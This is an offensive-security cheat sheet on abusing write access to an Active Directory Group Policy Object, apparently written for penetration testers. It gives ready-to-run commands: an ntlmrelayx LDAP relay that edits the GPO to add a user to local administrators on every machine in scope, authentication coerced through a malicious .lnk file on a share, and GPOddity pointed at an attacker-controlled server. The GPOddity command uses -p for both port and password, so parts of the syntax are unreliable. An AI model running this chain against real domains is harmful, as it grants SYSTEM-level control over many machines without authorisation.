# GPO Abuse (GPOddity)

Abuse GenericWrite on a GPO via LDAP relay (ntlmrelayx) to modify a GPO and execute commands as SYSTEM on all machines in scope.

## Prerequisites
- GenericWrite on a GPO object in AD
- Ability to coerce NTLM authentication (e.g., via `.lnk` file on a share)

## Setup ntlmrelayx for LDAP relay
```bash
# On attacker machine
ntlmrelayx.py -t ldap://<DC> --no-smb-server --gpotarget <GPO_GUID> --gpoaction add --command "net localgroup administrators <domain>\<user> /add" --http-port 8080
```

## Coerce Authentication via LNK
Create a malicious `.lnk` that points to your ntlmrelayx HTTP listener. Place on a share accessible to target users/admins.

When any domain user on an affected machine visits the share, their NTLM credentials are relayed to modify the GPO.

## Using GPOddity Directly
If you have write access to GPO files (SYSVOL):
```bash
python3 GPOddity.py -a <attacker_ip> -p <smb_server_port> --gpo-id <GPO_ID> -d <DOMAIN> -u <USER> -p <PASS> -dc-ip <DC_IP>
```

## Notes
- GPO applies on next Group Policy refresh (max 90 min) or force with `gpupdate /force`
- Target: `Computer Configuration\Windows Settings\Scripts\Startup` or `Scheduled Tasks`
- Clean up: revert GPO changes after obtaining access
- Requires LDAP signing disabled or relay over LDAPS
